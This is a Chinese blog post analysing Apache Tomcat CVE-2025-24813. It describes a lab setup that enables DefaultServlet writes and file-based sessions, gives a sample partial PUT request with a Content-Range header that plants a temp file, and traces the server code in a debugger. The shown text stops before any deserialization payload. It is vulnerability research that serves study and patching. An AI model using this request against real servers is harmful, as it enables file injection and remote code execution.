<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2025-24813详细分析 | zyyyc</title><meta name="author" content="zhangyuechuan"><meta name="copyright" content="zhangyuechuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：Tomcat 是一个开源的、轻量级的 Web 应用服务器 和 Servlet 容器。它由 Apache 软件基金会下的 Jakarta 项目开发，是目前最流行的 Java Web 服务器之一。 其官方已经公布的漏洞的详细情况：https:&#x2F;&#x2F;lists.apache.org&#x2F;thread&#x2F;j5fkjv2k477os90nczf2v9l61fb0kkgq  该漏洞的核心在于 Tomcat 在处">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-24813详细分析">
<meta property="og:url" content="https://zyyc0.github.io/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="zyyyc">
<meta property="og:description" content="前言：Tomcat 是一个开源的、轻量级的 Web 应用服务器 和 Servlet 容器。它由 Apache 软件基金会下的 Jakarta 项目开发，是目前最流行的 Java Web 服务器之一。 其官方已经公布的漏洞的详细情况：https:&#x2F;&#x2F;lists.apache.org&#x2F;thread&#x2F;j5fkjv2k477os90nczf2v9l61fb0kkgq  该漏洞的核心在于 Tomcat 在处">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zyyc0.github.io/img/123.png">
<meta property="article:published_time" content="2025-04-08T14:50:24.000Z">
<meta property="article:modified_time" content="2025-04-08T14:51:47.069Z">
<meta property="article:author" content="zhangyuechuan">
<meta property="article:tag" content="全网最详细调试分析过程">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zyyc0.github.io/img/123.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2025-24813详细分析",
  "url": "https://zyyc0.github.io/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/",
  "image": "https://zyyc0.github.io/img/123.png",
  "datePublished": "2025-04-08T14:50:24.000Z",
  "dateModified": "2025-04-08T14:51:47.069Z",
  "author": [
    {
      "@type": "Person",
      "name": "zhangyuechuan",
      "url": "https://zyyc0.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zyyc0.github.io/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":100,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2025-24813详细分析',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #b26770;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/123.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-solid fa-image"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/write/"><i class="fa-fw fa-solid fa-feather-pointed"></i><span> 闲言</span></a></div><div class="menus_item"><a class="site-page" href="/talk2me/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://haowallpaper.com/link/common/file/previewFileImg/15691089397322048" alt="Logo"><span class="site-name">zyyyc</span></a><a class="nav-page-title" href="/"><span class="site-name">CVE-2025-24813详细分析</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-solid fa-image"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/write/"><i class="fa-fw fa-solid fa-feather-pointed"></i><span> 闲言</span></a></div><div class="menus_item"><a class="site-page" href="/talk2me/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2025-24813详细分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-08T14:50:24.000Z" title="发表于 2025-04-08 22:50:24">2025-04-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-08T14:51:47.069Z" title="更新于 2025-04-08 22:51:47">2025-04-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>Tomcat 是一个开源的、轻量级的 Web 应用服务器 和 Servlet 容器。它由 Apache 软件基金会下的 Jakarta 项目开发，是目前最流行的 Java Web 服务器之一。</p>
<p>其官方已经公布的漏洞的详细情况：<br><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402211536740.png" alt="image-20250402211536740"></p>
<p>该漏洞的核心在于 Tomcat 在处理不完整PUT请求上传时，会使用一个基于用户提供的文件名和路径生成的临时文件。</p>
<p>如果满足以下所有条件，则恶意用户能够查看 安全敏感文件和&#x2F;或向这些文件注入内容：</p>
<p>1、为DefaultServlet 启用写的权限（默认禁用）</p>
<p>2、支持 partial PUT，能够将恶意的序列化数据写入到会话文件中（默认启用）</p>
<p>3、应用程序正在使用 Tomcat 的基于文件的会话持久性并且使用了默认的会话存储位置（默认存储位置）</p>
<p>4、含有反序列化的gadget</p>
<p><strong>受影响版本</strong></p>
<ul>
<li>Apache Tomcat 11.0.0-M1 至 11.0.2</li>
<li>Apache Tomcat 10.1.0-M1 至 10.1.34</li>
<li>Apache Tomcat 9.0.0-M1 至 9.0.98</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>创建一个Tomcat项目：<br><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402214555727.png" alt="image-20250402214555727"></p>
<p>Tomcat使用9.0.98进行复现：<br><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip</a></p>
<p>将包里面的libs目录加入到依赖中：<br><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402215831040.png" alt="image-20250402215831040"></p>
<p>接下来去导入我们的cc-3.2.1依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;dependency&gt;<br>    &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>    &lt;version&gt;3.2.1&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure>

<p>接下来去开启利用条件：<br>这里会在Tomcat的conf&#x2F;web.xml中，将DefaultServlet的readonly配置为false，启用写入功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;init-param&gt;<br>    &lt;param-name&gt;readonly&lt;/param-name&gt;<br>    &lt;param-value&gt;false&lt;/param-value&gt;<br>&lt;/init-param&gt;<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402221327681.png" alt="image-20250402221327681"></p>
<p>这里涉及到另外一个模糊的点：<strong>Tomcat的<code>conf/web.xml</code>和IDEA中<code>WEB-INF/web.xml</code>之间的关系</strong></p>
<p>Tomcat的<code>conf/web.xml</code>文件是一个全局配置文件，用于定义整个Tomcat服务器上所有Web应用的默认配置。它包含了一些默认的Servlet、Filter、Listener等组件的配置，以及一些全局性的设置.</p>
<p>在IDEA中，<code>WEB-INF/web.xml</code>是特定于某个Web项目的配置文件，用于定义该Web应用的部署信息。</p>
<p>Tomcat在加载Web应用时，会先读取<code>conf/web.xml</code>文件，然后读取<code>WEB-INF/web.xml</code>文件。</p>
<p>两者的关系可以总结为以下几点：</p>
<ul>
<li><strong>全局配置优先</strong>：<code>conf/web.xml</code>中的配置是全局性的，默认适用于所有Web应用。<code>WEB-INF/web.xml</code>中的配置是针对特定项目的，可以覆盖<code>conf/web.xml</code>中的某些设置。</li>
<li><strong>互补关系</strong>：<code>conf/web.xml</code>提供默认的全局配置，而<code>WEB-INF/web.xml</code>用于定义项目的个性化配置，两者共同决定了Web应用的行为。</li>
<li><strong>加载顺序</strong>：Tomcat会先加载<code>conf/web.xml</code>，然后加载<code>WEB-INF/web.xml</code>。如果两者中有相同的配置项，<code>WEB-INF/web.xml</code>中的配置会覆盖<code>conf/web.xml</code>中的配置。</li>
</ul>
<p>实际应用中应该注意的事项：</p>
<ul>
<li><strong>全局配置的修改</strong>：如果需要对所有Web应用进行统一配置（如安全设置），可以修改<code>conf/web.xml</code>。但通常情况下，<code>conf/web.xml</code>的默认配置已经足够，不建议频繁修改。</li>
<li><strong>项目配置的自定义</strong>：对于特定的Web应用，建议通过<code>WEB-INF/web.xml</code>进行个性化配置，避免影响其他应用。</li>
<li><strong>版本控制</strong>：<code>WEB-INF/web.xml</code>是项目的一部分，应该纳入版本控制（如Git），而<code>conf/web.xml</code>通常是Tomcat的默认文件，不建议纳入版本控制。</li>
</ul>
<p>接下来需要去开启File文件会话存储：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;Manager className=&quot;org.apache.catalina.session.PersistentManager&quot;&gt;<br>    &lt;Store className=&quot;org.apache.catalina.session.FileStore&quot;/&gt;<br>&lt;/Manager&gt;<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402221812718.png" alt="image-20250402221812718"></p>
<p>对于其他的配置都不用管，因为PUT操作默认是启动的</p>
<p>接下来为WEB项目添加一个Tomcat框架：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402222046961.png" alt="image-20250402222046961"></p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402222616345.png" alt="image-20250402222616345"></p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402222723396.png" alt="image-20250402222723396"></p>
<p>首先尝试一下PUT请求：<br><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250402223444246.png" alt="image-20250402223444246"></p>
<p>在 HTTP 协议中，<code>Content-Range</code> 字段用于表示客户端通过分段传输的方式上传或下载文件。例如 <code>Content-Range: bytes 0-1000/1200</code> 表示文件总大小是1200字节，本次上传的是前1001字节（0-1000），后续上传剩余部分（1001-1200）</p>
<p>所以利用上述这个没有传完，分段传输的性质，可以向默认存储位置 work\Catalina\localhost\ROOT 注入文件</p>
<p>放行请求后去查看ROOT目录：<br>发现在Tomcat的目录下是没有的。</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250403152838609.png" alt="image-20250403152838609"></p>
<p>此时又涉及到了一个知识点：idea启动时打印CATALINA_BASE与设置的系统环境变量不一致问题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36929123/article/details/114604717%EF%BC%88%E6%96%87%E7%AB%A0%E4%B8%AD%E6%9C%89%E4%B8%AA%E5%9C%B0%E6%96%B9%E6%9C%89%E9%94%99%EF%BC%89">https://blog.csdn.net/qq_36929123/article/details/114604717（文章中有个地方有错）</a></p>
<p>这里可以对其进行设置：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250403153437037.png" alt="image-20250403153437037"></p>
<p>这是设置的Base目录</p>
<p>这里设置为Tomcat文件所在的目录：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250403153638536.png" alt="image-20250403153638536"></p>
<p>但是这里需要注意一个问题，上述文章中提到了修改端口，但是实际上，如果我们指定的base地址为本地下载的Tomcat，但是我们就不能随便修改端口，应该还是要设置为8080端口，因为他会使用tomcat文件下conf文件夹中的server.xml中的默认端口号，需要将其修改掉。</p>
<p>由于BP端口的原因，将其端口更改为8081</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407151615393.png" alt="image-20250407151615393"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74445303/article/details/142371133">https://blog.csdn.net/m0_74445303/article/details/142371133</a></p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407151716311.png" alt="image-20250407151716311"></p>
<p>这里发现如果启动调试模式，我们的CATALINA_BASE值又会变为idea中的默认配置。按照下列进行修改即可。</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407165131598.png" alt="image-20250407165131598"></p>
<p>接下来重新进行实验：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407152149295.png" alt="image-20250407152149295"></p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407152201506.png" alt="image-20250407152201506"></p>
<p>会返回409状态码说冲突了在下述目录下找到发现了临时生成的文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">\work\Catalina\localhost\ROOT<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407152349424.png" alt="image-20250407152349424"></p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407152446055.png" alt="image-20250407152446055"></p>
<p>Tomcat 对不完整的PUT请求上传时的文件名处理机制：文件路径中的分隔符 <code>/</code> 会被转换为 <code>.</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PUT /poc/zyyyc HTTP/1.1<br>Host: 10.133.25.153:8081<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ak;q=0.7<br>Content-Range: bytes 0-1000/1200<br>Cookie: JSESSIONID=2AB7E590CD91C13110D75BE9DCF8D7E3<br>Connection: close<br>Content-Length: 14<br><br>&#123;&#123;(zyyyc...)&#125;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="临时文件生成"><a href="#临时文件生成" class="headerlink" title="临时文件生成"></a>临时文件生成</h3><p>通过查看官方通告发现漏洞代码修补处：<br><a target="_blank" rel="noopener" href="https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c">https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c</a></p>
<p>在java&#x2F;org&#x2F;apache&#x2F;catalina&#x2F;servlets&#x2F;DefaultServlet.java进行了修改：<br><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407153844869.png" alt="image-20250407153844869"></p>
<p>发现更改的主要的点在：executePartialPut函数中对文件名进行处理的那个地方：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407154430286.png" alt="image-20250407154430286"></p>
<p>我们在这里打上断点：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407154502395.png" alt="image-20250407154502395"></p>
<p>主要目的是查看他序列化和反序列化的点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">doPut:623, DefaultServlet (org.apache.catalina.servlets)<br>service:558, HttpServlet (javax.servlet.http)<br>service:512, DefaultServlet (org.apache.catalina.servlets)<br>service:623, HttpServlet (javax.servlet.http)<br>internalDoFilter:199, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:144, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:51, WsFilter (org.apache.tomcat.websocket.server)<br>internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:144, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:168, StandardWrapperValve (org.apache.catalina.core)<br>invoke:90, StandardContextValve (org.apache.catalina.core)<br>invoke:482, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:130, StandardHostValve (org.apache.catalina.core)<br>invoke:93, ErrorReportValve (org.apache.catalina.valves)<br>invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:74, StandardEngineValve (org.apache.catalina.core)<br>service:346, CoyoteAdapter (org.apache.catalina.connector)<br>service:396, Http11Processor (org.apache.coyote.http11)<br>process:63, AbstractProcessorLight (org.apache.coyote)<br>process:937, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:52, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:745, Thread (java.lang)<br></code></pre></td></tr></table></figure>

<p>执行到处理Put请求的地方doPut：<br><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407154825569.png" alt="image-20250407154825569"></p>
<p>查看路径处理策略：<br><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407165613384.png" alt="image-20250407165613384"></p>
<p>首先拿到临时文件的目录位置，之后处理请求路径将<code>/</code>替换为<code>.</code></p>
<p>之后会尝试在下面的if语句中，创建临时文件，并且在JVM正常终止时删除文件。</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407165709740.png" alt="image-20250407165709740"></p>
<p>之后会尝试通过原路径：<code>/path/zyyyc</code>去找到该路径下的文件。（这里显然是找不到的）。</p>
<p>会判断返回出来的oldResource判断其是否为file文件，如果是file文件并且文件存在，那么会将老文件的内容合并到新的文件中。</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407160025515.png" alt="image-20250407160025515"></p>
<p>这里原文件是不存在的。（如何判断原文件是否存在的？）</p>
<p>之后会给临时文件设置写入长度，并将我们写入的poc写入到临时文件中：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407170014435.png" alt="image-20250407170014435"></p>
<p>最后将临时文件返回出去：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407170040792.png" alt="image-20250407170040792"></p>
<p>之后回到DefaultServlet的doPut方法中，为该临时文件创建一个文件输入流对象，并将其赋值给resourceInputStream变量，用于读取contentFile文件的内容。</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407164114664.png" alt="image-20250407164114664"></p>
<p>接下来在if语句中会向我们的path路径下写东西</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407170303925.png" alt="image-20250407170303925"></p>
<p>我们跟入到该函数中，来到DirResourceSet的write方法：</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407170545102.png" alt="image-20250407170545102"></p>
<p>这里是允许覆盖的，所以会进入到overwrite语句逻辑中</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407170711880.png" alt="image-20250407170711880"></p>
<p>之后会将我们的临时文件复制到该目录中，但是会复制失败。原因可能是找不到该对应目录。一路return出去<br>相当于这条if语句会执行失败：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">this.resources.write(path, (InputStream)resourceInputStream, true)<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407171021020.png" alt="image-20250407171021020"></p>
<p>并最终返回给我们409的错误。</p>
<p>这里还需要去弄清另外一个参数：<code>Content-Range: bytes 0-1000/1200</code></p>
<p>发现当我们修改为：<code>Content-Range: bytes 0-1000/1000</code>那么是不会创建临时文件的，这也证明了其实这部分逻辑就是根据这个参数来处理我们的临时文件。</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407171835041.png" alt="image-20250407171835041"></p>
<p>去跟踪查看我们range的赋值情况</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407172020232.png" alt="image-20250407172020232"></p>
<p>首先会获取到我们Content-Range的范围，发现如果刚好发完的话会返回请求错误。</p>
<p>跟入到ContentRange#parse函数中发现：<br><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407172307788.png" alt="image-20250407172307788"></p>
<p>该代码用于解析HTTP Content-Range头部字段。读取单位（如bytes）； 按顺序校验并读取起始值、结束值、总长度；检查格式符号（”-“、”&#x2F;“）和非法字符”X”；最终验证数值有效性，返回对象或null</p>
<p>对于其有效性的验证：要求：start不能为负数（&gt;&#x3D;0），end不小于start，<strong>且length超过end值</strong>。三个条件同时满足返回true，否则false。</p>
<p><img src="C:\Users\32737\AppData\Roaming\Typora\typora-user-images\image-20250407172458625.png" alt="image-20250407172458625"></p>
<p>所以我们不能设置为刚好发完的状态。现在文件已经写入后，开始找反序列化的点。</p>
